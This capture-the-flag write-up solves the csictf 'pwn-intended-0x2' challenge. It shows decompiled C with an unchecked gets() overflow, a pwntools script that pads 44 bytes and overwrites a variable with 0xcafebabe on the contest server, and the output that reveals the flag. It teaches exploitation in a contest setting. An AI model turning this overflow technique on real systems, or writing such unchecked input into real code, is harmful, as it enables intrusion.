## pwn-intended-0x2
The main idea finding the flag is overwrite the correct hex after padding.

#### Step-1:
After I downloaded `pwn-intended-0x2`, I reversed it with IDA, I got this source code:

```c
undefined8 main(void)

{
  char local_38 [44];
  int local_c;

  local_c = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to csictf! Where are you headed?");
  gets(local_38);
  puts("Safe Journey!");
  if (local_c == -0x35014542) {
    puts("You\'ve reached your destination, here\'s a flag!");
    system("/bin/cat flag.txt");
  }
  return 0;
}
```

#### Step-2:
`local_c` is checked for a hex value of `0xcafebabe`. Since the size of local array is 44, we have to write `0xcafebabe` after 44 bytes.

#### Step-3:
I wrote a very common `rev_exploit.py` to pwn into the machine.

```python
import pwn

r = pwn.remote('chall.csivit.com', 30007)

payload = "A"*44 + '\xbe\xba\xfe\xca'

r.sendline(payload)
r.interactive()
```

#### Step-4:
When I finally ran this `python3 rev_exploit.py`, I got this output:

```bash
[+] Opening connection to chall.csivit.com on port 30007: Done
[*] Switching to interactive mode
Welcome to csictf! Where are you headed?
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}[*] Got EOF while reading in interactive 
$
[*] Interrupted
```
Voila! I got the flag there.

#### Step-5:
Finally the flag becomes:
`csictf{c4n_y0u_re4lly_telep0rt?}`